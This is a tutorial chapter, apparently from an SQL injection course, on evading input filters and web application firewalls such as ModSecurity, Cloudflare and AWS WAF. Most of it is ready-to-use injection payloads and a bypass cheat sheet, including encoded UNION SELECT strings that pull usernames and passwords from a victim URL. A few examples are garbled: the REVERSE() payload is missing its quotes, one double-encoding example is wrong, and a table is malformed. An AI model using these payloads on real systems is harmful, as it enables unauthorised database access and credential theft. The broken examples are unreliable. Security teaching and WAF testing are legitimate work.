# 09 - Filter Evasion and WAF Bypass

## Why Filters Fail

Web Application Firewalls (WAFs) and input filters attempt to detect SQL injection patterns. But they rely on **signature matching**, not **semantic understanding**.

**Key insight**: Same SQL logic, different syntax = bypass.

## Common Filter Techniques

| Filter Type    | Detection Method                 | Bypass Strategy                    |
| -------------- | -------------------------------- | ---------------------------------- |
| **Keyword**    | Match `UNION`, `SELECT`, `OR`    | Encoding, comments, case variation |
| **Pattern**    | Regex for common payloads        | Alternative syntax, obfuscation    |
| **Length**     | Max input size                   | Split payloads, multi-request      |
| **Character**  | Block quotes, semicolons         | Encoding, alternative quotes       |
| **Behavioral** | Rate limiting, anomaly detection | Slow attacks, distributed requests |

## Case Variation

### Basic Obfuscation

```sql
-- Blocked
UNION SELECT 1,2,3--

-- Bypass
UnIoN SeLeCt 1,2,3--
uNiOn sElEcT 1,2,3--
UN/**/ION SELECT/**/1,2,3--
```

### Mixed Case (works on some systems)

```sql
UnIoN/**/AlL/**/sElEcT/**/1,2,3
UnIoN/**/DiStInCt/**/sElEcT/**/1,2,3
```

## Comment Injection

### Inline Comments

| Database | Comment Style          | Example              |
| -------- | ---------------------- | -------------------- |
| MySQL    | `/**/`, `/*anything*/` | `UN/**/ION SELECT 1` |
| MySQL    | `#`                    | `SELECT 1#`          |
| MySQL    | `-- `                  | `SELECT 1-- `        |
| Generic  | `/*comment*/`          | `SEL/*test*/ECT 1`   |

### Nested Comments (MySQL)

```sql
-- Blocked
UNION SELECT 1,2,3 FROM users--

-- Bypass with nested comments
UNI/**/ON/**/SE/**/LECT/**/1,2,3/**/FR/**/OM/**/users--

-- Alternative
/*U*/NION/*S*/ELECT/*1*/1,2,3/*F*/ROM/*u*/sers--
```

## Encoding Techniques

### URL Encoding

```
Space:        %20 or +
Single quote: %27 or %2527 (double-encoded)
Double quote: %22
Hash:         %23
```

Example:

```
Original: ' OR '1'='1'--
Encoded:  %27%20%4F%52%20%27%31%27%3D%27%31%27%2D%2D
```

### Unicode/UTF-8 Encoding

```sql
-- Blocked
' OR 1=1--

-- Unicode quote (U+02BC): ʼ OR 1=1--
```

### Double URL Encoding

```
First encode:  %27 (% = %25, 2 = %32, 7 = %37)
Double:        %252527

Original: '
Once decode: %27
Final:       '
```

## Character Alternatives

### Space Replacements

```sql
-- Blocked (space between keywords)
UNION SELECT 1,2,3

-- Bypass with:
UNION%0bSELECT%0b1,2,3       -- Vertical tab
UNION%0dSELECT%0d1,2,3       -- Carriage return
UNION%0aSELECT%0a1,2,3       -- Newline
UNION%0cSELECT%0c1,2,3       -- Form feed
UNION/**/SELECT/**/1,2,3     -- Comment
UNION+(SELECT+1,2,3)          -- Parentheses with +
```

### Quote Alternatives

```sql
-- Blocked
' OR '1'='1'--

-- Bypass:
" OR "1"="1"--          -- Double quotes
` OR `1`=`1`--          -- Backticks (MySQL)
' OR CHAR(49)=CHAR(49)-- -- ASCII function
```

### Comma Replacements

```sql
-- Blocked
UNION SELECT 1,2,3 FROM users

-- Bypass (JOIN method):
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- Or (MySQL):
UNION SELECT 1,2,3 FROM users WHERE id IN(1)
```

## Keyword Alternatives

### SELECT Alternatives

```sql
-- Blocked
UNION SELECT 1,2,3

-- MySQL alternatives:
UNION ALL SELECT 1,2,3
UNION DISTINCT SELECT 1,2,3
UNION/*!50000SELECT*/1,2,3
```

### OR Alternatives

```sql
-- Blocked
' OR '1'='1'--

-- Bypass:
' || '1'='1'--            -- PostgreSQL/Oracle
' | '1'=1--               -- Bitwise OR (some contexts)
' AND 1 IN (1)--          -- Logical equivalent
' AND 1 BETWEEN 1 AND 1-- -- Alternative logic
```

### AND Alternatives

```sql
-- Blocked
' AND 1=1--

-- Bypass:
' && 1=1--               -- MySQL/PG logical AND
' HAVING 1=1--            -- Having clause
' LIMIT 1=1--            -- In some contexts
```

## WAF-Specific Bypasses

### ModSecurity (Common Rules)

```sql
-- Rule: Block UNION SELECT
-- Bypass:
/*!50000Union*/All/*!50000Select*/1,2,3

-- Rule: Block SQL comments
-- Bypass:
UNI%0aON%0aSE%0aLECT%0a1,2,3
```

### CloudFlare

```sql
-- Bypass case filtering
UnIOn/**/SeLeCt/**/1,2,3

-- Bypass with encoding
%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33
```

### AWS WAF

```sql
-- Bypass with comments in keywords
UNI/**/ON/**/SEL/**/ECT/**/1,2,3

-- Double encoding
%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%2520%2531%252C%2532%252C%2533
```

## Advanced Obfuscation

### String Concatenation

```sql
-- Blocked
' UNION SELECT password FROM users--

-- Concatenated:
' UNI'||'ON SEL'||'ECT pass'||'word FR'||'OM use'||'rs--

-- Or with CHAR:
' UNION SELECT password FROM users--
-- Becomes:
CHAR(39)||CHAR(32)||CHAR(85)||CHAR(78)...etc
```

### Hex Encoding (MySQL)

```sql
-- Convert string to hex
SELECT HEX('SELECT') -- 53454C454354

-- Use in payload:
UNION SELECT * FROM (SELECT 0x53454C454354)s
```

### Dynamic Execution (where supported)

```sql
-- MSSQL: Execute from string
'; EXEC('UNIO'+'N SELE'+'CT 1,2,3')--

-- PostgreSQL: EXECUTE
'; EXECUTE 'UNION SELECT 1,2,3'--

-- Oracle: EXECUTE IMMEDIATE
'; EXECUTE IMMEDIATE 'UNION SELECT 1 FROM DUAL'--
```

### Reverse() Function Bypass

When keywords like `UNION` and `SELECT` are blocked, use the `REVERSE()` function to construct them dynamically:

```sql
-- Blocked
' UNION SELECT 1,2,3--

-- Bypass using REVERSE:
' || REVERSE(noinu) || REVERSE(tceles) || 1,2,3--

-- Full payload example:
' || REVERSE(noinu) || REVERSE(tceles) || username,password || REVERSE(morf) || users--
```

**How it works:**

- `REVERSE('noinu')` = `'union'`
- `REVERSE('tceles')` = `'select'`
- `REVERSE('morf')` = `'from'`

This bypasses keyword filters that check for literal `UNION`, `SELECT`, `FROM` strings.

### Double URL Encoding

When WAFs decode once but application decodes twice:

```sql
-- Single encoded (blocked by WAF)
%55%4E%49%4F%4E%20%53%45%4C%45%43%54

-- Double encoded (WAF sees %2555, decodes to %55, blocks)
-- But application decodes twice: %2555 -> %55 -> U

-- Payload:
%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554
```

**Double encoding table:**
| Character | URL Encode | Double Encode |
|-----------|------------|---------------|
| U | %55 | %2555 |
| N | %4E | %254E |
| I | %49 | %2549 |
| O | %4F | %254F |
| Space | %20 | %2520 |
| S | %53 | %2553 |
| E | %45 | %2545 |
| L | %4C | %254C |
| C | %43 | %2543 |
| T | %54 | %2554 |

### Hex Concatenation Encoding

Use hex values concatenated to build SQL strings without using keywords directly:

**MySQL:**

```sql
-- Blocked
' UNION SELECT @@version--

-- Bypass with hex concatenation:
' UNION SELECT concat(0x223e,@@version,0x3c62723e)--

-- Or for table names:
UNION SELECT concat(0x223e3c62723e,table_name,0x3c62723e3c62723e) FROM information_schema.tables--
```

**PostgreSQL:**

```sql
-- Using decode():
' UNION SELECT decode('227276657273696f6e','hex')--

-- Combine with data extraction:
' UNION SELECT decode(encode(username::bytea,'hex'),'hex') FROM users--
```

### Mod_rewrite %0b Bypass

When ModSecurity blocks comments `/**/` and `/**/union/**/` is blocked, use vertical tab `%0b`:

```sql
-- Blocked: http://victim.com/main/news/id/1/**/
Forbidden: /**/ comments detected

-- Bypass with vertical tab (%0b):
http://victim.com/main/news/id/1%0b||%0blpad(first_name,7,1).html

-- Full SQL injection:
1%0bUNION%0bSELECT%0busername,password%0bFROM%0badmin
```

**Why %0b works:**

- `%0b` = Vertical Tab character (ASCII 11)
- Not commonly filtered like space or newline
- Parsed as whitespace by SQL engines
- ModSecurity `/**/` rules don't catch it

**Alternative whitespace bytes:**

- `%0a` - Line feed (LF)
- `%0d` - Carriage return (CR)
- `%0c` - Form feed (FF)
- `%0b` - Vertical tab (VT)
- `%09` - Horizontal tab
- `%a0` - Non-breaking space (MySQL)

## Bypassing Input Validation

### Length Restrictions

```sql
-- Max 20 characters
-- Use shortest possible:
'||1--          (6 chars)
'OR 1=1--       (9 chars)
```

### Character Whitelist

```sql
-- Only numbers allowed in input
-- Bypass: Numeric operators only
1 AND 1=1       -- Logic test
1 OR 1=1        -- Logic test
1 ORDER BY 1    -- Column count
```

### Type Enforcement

```sql
-- Input must be numeric
-- Inject numeric logic:
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1 ORDER BY 1 -- Error if >1 column
```

## WAF Rule Examples (For Defenders)

Understanding WAF rules helps attackers understand what defenses they face.

### ModSecurity OWASP CRS Rules

```apache
# Rule: Detect SQL injection keywords
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
    "@rx (?i:(?:select\s*\*?\s*from|(?:delete|drop|truncate)\s+table|union(?:\s+all)?\s*\(?!\*))" \
    "id:942190,phase:2,deny,status:403,msg:'SQL Injection Attack'"

# Rule: Detect single quote in input
SecRule ARGS "@rx '" \
    "id:942100,phase:2,deny,status:403,msg:'SQL Injection Attempt'"
```

### AWS WAF Rules

```json
{
  "Name": "SQLInjectionRule",
  "Priority": 1,
  "Statement": {
    "SqliMatchStatement": {
      "FieldToMatch": {
        "Body": {}
      },
      "TextTransformations": [
        { "Priority": 0, "Type": "URL_DECODE" },
        { "Priority": 1, "Type": "HTML_ENTITY_DECODE" }
      ]
    }
  },
  "Action": { "Block": {} },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "SQLInjectionRule"
  }
}
```

### Nginx WAF (Lua)

```lua
-- Block common SQL keywords
local sql_keywords = {"union", "select", "insert", "update", "delete", "drop", "--", ";"}
local args = ngx.req.get_uri_args()
for key, val in pairs(args) do
    for _, keyword in ipairs(sql_keywords) do
        if string.find(string.lower(val), keyword, 1, true) then
            ngx.exit(403)
        end
    end
end
```

### Why These Rules Fail

| Rule Approach    | Bypass Method                             |
| ---------------- | ----------------------------------------- |
| Keyword matching | Case variation: `SeLeCt`                  |
| Space detection  | Comment: `/**/`                           |
| Quote detection  | Encoding: `%27`                           |
| Pattern matching | Alternative syntax: `LIKE` instead of `=` |

## Practical Bypass Testing

### Methodology

```
1. Test basic injection (confirm vulnerability exists)
2. Identify blocking patterns (which keywords blocked)
3. Try case variations
4. Add inline comments
5. Try encoding (URL, double URL, Unicode)
6. Use keyword alternatives
7. Combine techniques
8. Test with time delays to confirm execution
```

### Confirm Bypass Works

```sql
-- Test 1: True condition with bypass
'/**/UnIoN/**/SeLeCt/**/1,2,3/**/FrOm/**/DuAl--

-- Test 2: False condition
'/**/AnD/**/1=2--

-- Test 3: Time delay
'/**/AnD/**/1=1/**/AnD/**/SlEeP(5)--
```

## Bypass Cheat Sheet

| Blocked  | Bypass Options                             |
| -------- | ------------------------------------------ | --- | --- |
| `UNION`  | `UNI/**/ON`, `UnIoN`, `/*!50000UNION*/`, ` |     | `   |
| `SELECT` | `SEL/**/ECT`, `SeLeCt`, `/*!50000SELECT*/` |
| `OR`     | `\|\|`, `\|`, `oR`, `O/**/R`               |
| `AND`    | `&&`, `&`, `AnD`, `A/**/ND`                |
| `FROM`   | `FR/**/OM`, `fRoM`, `/*!50000FROM*/`       |
| `WHERE`  | `W/**/HERE`, `WhErE`                       |
| Space    | `/**/`, `%0b`, `%0a`, `%0c`, `%0d`, `+`    |
| `=`      | `LIKE`, `IN`, `BETWEEN`, `<=>` (MySQL)     |
| `'`      | `"`, `\``, `CHAR(39)`, hex-encoded         |

## Practice Exercises

### Exercise 1: Case Variation

Bypass filter that blocks `UNION SELECT` using case variation only.

### Exercise 2: Comment Injection

Bypass filter that blocks `UNION`, `SELECT`, `OR` using inline comments.

### Exercise 3: Encoding Bypass

Filter blocks all keywords. Use URL encoding to bypass.

### Exercise 4: Space Bypass

Filter blocks spaces. Extract table names without using space character.

### Exercise 5: Real WAF

Given payload blocked by ModSecurity, create 3 different bypasses.

## Key Takeaways

1. **Filters work on signatures**, not semantics
2. **Encoding** is universal bypass technique
3. **Database-specific syntax** often not covered
4. **Combination** of techniques increases success rate
5. **Always confirm** bypass with time-based or boolean test

## Next Step

Continue to [10 - Advanced Techniques](10-Advanced-Techniques.md) for stacked queries and file operations.
